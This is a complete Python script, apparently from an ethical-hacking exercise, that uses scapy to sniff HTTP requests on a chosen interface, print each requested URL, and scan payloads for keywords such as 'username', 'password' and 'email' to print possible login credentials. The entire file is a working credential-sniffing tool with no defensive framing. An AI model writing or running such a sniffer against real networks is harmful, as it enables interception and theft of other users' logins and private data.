#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse
def get_arguments():
    # Parser for options
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Write interface that you want to sniff")
    arguments = parser.parse_args()
    if not arguments.interface:
        parser.error("[-] Please specify an interface, use --help for more info. ")
    return arguments
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        decoded_load = load.decode('utf-8', errors='ignore')
        keywords = ["username", "user", "login", "password", "pass", "register", "log in", "account", "mail", "email",
                    "auth", "data"]
        for keyword in keywords:
            if keyword in decoded_load:
                return decoded_load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request  >> "+ str(url, 'utf-8'))
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

arguments = get_arguments()
sniff(arguments.interface)
